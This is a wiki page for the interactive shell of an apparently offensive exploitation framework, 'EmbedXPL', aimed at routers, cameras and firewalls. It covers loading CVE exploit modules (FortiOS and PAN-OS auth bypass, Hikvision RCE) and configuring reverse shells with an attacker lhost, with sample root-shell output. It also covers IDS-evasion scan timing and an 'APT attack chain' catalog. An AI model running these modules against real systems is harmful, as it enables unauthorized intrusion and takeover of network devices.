# Interactive Shell Commands

**Language:** English (en-US) | **pt-BR:** [../pt-BR/02-shell-interativo-comandos.md](../pt-BR/02-shell-interativo-comandos.md)

---

## Starting the shell

```bash
embedxpl           # recommended (after pip install)
exf                # alias
python -m embedxpl # module entry point
python exf.py      # legacy bootstrap (from git clone)
```

The prompt changes depending on whether a module is loaded:

```text
exf >                          # no module loaded
exf (dir_300_600_rce) >        # module loaded
```

Tab completion is available for all commands and module paths.

---

## Full command reference

### Global commands (always available)

| Command | Syntax | Description |
|---------|--------|-------------|
| `help` | `help` | Print the command reference |
| `use` | `use <path>` | Load a module by its dotted or slash path |
| `search` | `search [term] [filters]` | Search modules by keyword, CVE, or vendor |
| `show` | `show <sub>` | Display listings (see subcommands below) |
| `exec` | `exec <shell command>` | Execute an OS shell command |
| `sysinfo` | `sysinfo` | Display CPU, RAM, GPU, compute mode |
| `compute` | `compute <mode>` | Set compute backend |
| `discover` | `discover [target] [opts]` | Network discovery and fingerprinting |
| `sessions` | `sessions [sub]` | Manage persistent scan sessions |
| `apt` | `apt [sub]` | APT (nation-state) attack chain catalog |
| `exit` | `exit` | Quit the shell |

### Module-context commands (require `use` first)

| Command | Syntax | Description |
|---------|--------|-------------|
| `run` | `run` | Execute the loaded module |
| `exploit` | `exploit` | Alias for `run` |
| `check` | `check` | Run the module's vulnerability check |
| `set` | `set <option> <value>` | Set a module option |
| `setg` | `setg <option> <value>` | Set a global option (persists across modules) |
| `unset` | `unset <option>` | Clear a module option |
| `unsetg` | `unsetg <option>` | Clear a global option |
| `show options` | `show options` | List all module options with types and defaults |
| `show advanced` | `show advanced` | List advanced/hidden options |
| `show info` | `show info` | Display module metadata |
| `show devices` | `show devices` | List target devices for the module |
| `show wordlists` | `show wordlists` | List wordlists available to the module |
| `back` | `back` | Unload current module |

---

## `use` — load a module

```text
exf > use exploits/routers/dlink/dir_300_600_rce
exf > use creds/routers/tplink/telnet_default_creds
exf > use scanners/cameras/herospeed_longsee_nvr_scan
exf > use payloads/cmd/bash_reverse_tcp
exf > use generic/upnp/igd_exploit
```

Module paths use forward slashes and are relative to `embedxpl/modules/`. Tab completion lists all available paths.

---

## `set` / `setg` — configure options

```text
exf (dir_300_600_rce) > set target 192.168.0.1
[+] target => 192.168.0.1

exf (dir_300_600_rce) > set port 8080
[+] port => 8080

exf (dir_300_600_rce) > set ssl true
[+] ssl => true

exf (dir_300_600_rce) > set threads 10
[+] threads => 10

# Set a global option that carries across all modules:
exf (dir_300_600_rce) > setg target 192.168.0.1
[+] target => 192.168.0.1 (global)
```

**Option data types:**

| Type | Shell input | Example |
|------|-------------|---------|
| `OptIP` | IPv4, IPv6, or `file://path` (multi-target) | `192.168.1.1`, `file:///tmp/hosts.txt` |
| `OptPort` | Integer 1–65535 | `443`, `9100` |
| `OptBool` | Exactly `true` or `false` | `true`, `false` |
| `OptString` | Any string | `admin`, `id`, `whoami` |
| `OptInteger` | Decimal or hex integer | `10`, `0x1F` |
| `OptFloat` | Floating-point number | `2.0`, `0.5` |
| `OptMAC` | MAC address | `aa:bb:cc:dd:ee:ff` |
| `OptWordlist` | `file://path` or `user:pass,...` | `file:///usr/share/wordlists/rockyou.txt` |

---

## `show options` — option table

```text
exf (globalprotect_auth_bypass_cve_2026_0257) > show options

Target options:
┌────────┬──────────────────┬─────────────────────────────────────────┐
│ Name   │ Current settings │ Description                             │
├────────┼──────────────────┼─────────────────────────────────────────┤
│ target │                  │ Target PAN-OS IP or hostname            │
│ port   │ 443              │ HTTPS port (default 443)                │
│ ssl    │ true             │ Use SSL/TLS                             │
└────────┴──────────────────┴─────────────────────────────────────────┘

Module options:
┌───────────────┬──────────────────────────┬──────────────────────────────────┐
│ Name          │ Current settings         │ Description                      │
├───────────────┼──────────────────────────┼──────────────────────────────────┤
│ forge_user    │ admin                    │ Username to forge in the cookie  │
│ forge_domain  │ paloaltonetworks.com     │ Domain in the forged cookie      │
│ probe_gateway │ true                     │ Also probe gateway endpoint      │
│ dump_session  │ true                     │ Dump session metadata on bypass  │
│ lhost         │                          │ Attacker IP for reverse shell    │
│ lport         │ 4444                     │ Listener port                    │
│ shell_type    │ auto                     │ Shell type (bash/python/...)     │
│ force_exploit │ false                    │ Skip check(), go straight to run │
│ ask_on_fail   │ true                     │ Prompt user if check() fails     │
└───────────────┴──────────────────────────┴──────────────────────────────────┘
```

---

## `check` and `run`

```text
exf (dir_300_600_rce) > check
[*] Checking vulnerability...
[+] Target is vulnerable

exf (dir_300_600_rce) > run
[*] Running module dir_300_600_rce...
[+] Command output: uid=0(root) gid=0(root)
```

| `check` return | Shell message |
|----------------|---------------|
| `True` | `[+] Target is vulnerable` |
| `False` | `[-] Target is not vulnerable` |
| Other / exception | `[*] Target could not be verified` |

**Shell Stager options** (available on all weaponized exploit modules):

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `lhost` | `OptString` | `""` | Attacker IP for reverse shell |
| `lport` | `OptPort` | `4444` | Listener port |
| `shell_type` | `OptString` | `auto` | Shell: `bash`, `nc`, `python`, `perl`, `ruby`, `php`, `awk`, `socat`, `powershell`, `powershell_b64`, `nc_bind`, `python_bind`, `meterpreter_linux`, `meterpreter_windows`, `meterpreter_php`, `php_webshell`, `aspx_webshell`, `auto` |
| `force_exploit` | `OptBool` | `false` | Skip `check()` and exploit directly |
| `ask_on_fail` | `OptBool` | `true` | Prompt to proceed if `check()` returns False |
| `pty_upgrade` | `OptBool` | `true` | Auto-send `python3 pty.spawn()` on shell connect |
| `listener_timeout` | `OptPort` | `60` | Seconds to wait for reverse shell connection |

Example with reverse shell:

```text
exf (fortios_auth_bypass_cve_2022_40684) > set target 10.0.0.5
exf (fortios_auth_bypass_cve_2022_40684) > set lhost 10.0.0.99
exf (fortios_auth_bypass_cve_2022_40684) > set lport 4444
exf (fortios_auth_bypass_cve_2022_40684) > set shell_type python
exf (fortios_auth_bypass_cve_2022_40684) > run
[*] FortiOS at 10.0.0.5:443 -- auth bypass
[+] Bypass active with header variant
[*] Phase 2 - Configuration dump...
[+] Admin Accounts: {"results": [{"name": "admin", ...}]}
[*] Phase 5 - Shell staging (type: python)...
[*] Payload: python3 -c "import socket,subprocess,os;..."
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 10.0.0.5:52241 -- entering PTY interaction
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.

$ whoami
root
$ id
uid=0(root) gid=0(root)
```

---

## `search` — find modules

```text
exf > search dlink
exf > search CVE-2021-36260
exf > search hikvision
exf > search fortinet
exf > search type=exploits cisco
exf > search vendor=sonicwall
exf > search device=routers netgear
```

**Search filters:**

| Filter | Values | Example |
|--------|--------|---------|
| `type=` | `exploits`, `creds`, `scanners`, `payloads`, `encoders`, `generic` | `type=exploits` |
| `device=` | Subdirectory of `exploits/` | `device=cameras` |
| `vendor=` | Any path segment | `vendor=paloalto` |
| `language=` | Subdirectory of `encoders/` | `language=python` |
| `payload=` | Subdirectory of `payloads/` | `payload=python` |

Sample output:

```text
exf > search CVE-2021-36260
[*] Search results for 'CVE-2021-36260':

  exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
  exploits/cameras/hikvision/ipc_rce_cve_2021_36260
```

---

## `discover` — network discovery

```text
# Scan a subnet (auto-detects local subnet if omitted)
exf > discover 192.168.1.0/24

# Scan with aggressive timing (T4)
exf > discover 192.168.1.0/24 --timing T4

# Scan from a targets file
exf > discover -T /tmp/targets.txt

# Ignore session cache and re-scan
exf > discover 192.168.1.0/24 --fresh
```

**Timing profiles:**

| Profile | Delay | Use Case |
|---------|-------|----------|
| `T0` | 300 s/probe | IDS evasion / paranoid |
| `T1` | 15 s/probe | Quiet audits |
| `T2` | 2 s/probe | Minimal network impact |
| `T3` | 0.5 s/probe | **Default** — normal |
| `T4` | 0.1 s/probe | Fast LAN scans |
| `T5` | 0 s/probe | CTF / isolated lab only |

Sample output:

```text
exf > discover 192.168.1.0/24
[*] Scanning 254 hosts (T3) ...
[*] OUI lookup: 3c:a3:7e -> HUAWEI TECHNOLOGIES CO.,LTD
[*] OUI lookup: cc:29:bd -> ZTE CORPORATION
[*] OUI lookup: 38:6b:1c -> SHENZHEN MERCURY (TP-Link)

+--------------------+-------------------+---------------------+---------------------+
| IP                 | MAC               | Vendor              | Suggested module    |
+--------------------+-------------------+---------------------+---------------------+
| 192.168.1.1        | 3c:a3:7e:aa:bb:cc | Huawei              | exploits/routers/.. |
| 192.168.1.2        | cc:29:bd:11:22:33 | ZTE                 | exploits/routers/.. |
| 192.168.1.100      | 44:19:b6:xx:xx:xx | Hikvision           | exploits/cameras/.. |
+--------------------+-------------------+---------------------+---------------------+

[*] 3 host(s) discovered. Use 'sessions show <ip>' for details.
```

---

## `sessions` — manage scan history

```text
exf > sessions list
exf > sessions show 192.168.1.1
exf > sessions export 192.168.1.1      # prints JSON
exf > sessions delete 192.168.1.1
exf > sessions purge                   # prompts confirmation: type "yes"
```

Sessions store per-host results in `~/.exf_sessions/` as JSON files, keyed by `sha256(ip + mac)`.

---

## `apt` — APT attack chain catalog

```text
exf > apt list
exf > apt show teamcnc-4
exf > apt search lazarus
exf > apt run teamcnc-4             # loads first module in the chain
exf > apt run teamcnc-4 2           # loads module at index 2
```

---

## `sysinfo` — system information

```text
exf > sysinfo
[*] CPU: Intel Core i7-12700H (16 cores)
[*] RAM: 15.6 GB used / 31.9 GB total
[*] GPU: NVIDIA RTX 3060 (6GB VRAM) — CUDA available
[*] Compute mode: auto (currently using: GPU)
[*] Platform: Linux 6.8.0-45-generic
[*] Python: 3.11.9
[*] EmbedXPL: v3.2.1 (2807 modules indexed)
```

---

## `exec` — run OS commands

```text
exf > exec whoami
exf > exec nmap -sV 192.168.1.1
exf > exec cat /etc/hosts
```

Commands are passed to `os.system()`.

---

## Output prefix conventions

| Prefix | Color | Meaning |
|--------|-------|---------|
| `[+]` | Green | Success / finding |
| `[-]` | Red | Error / failure |
| `[*]` | Blue | Status / progress |
| `[!]` | Yellow | Warning |
| (none) | White | Informational |


[Wiki hub](../README.md)
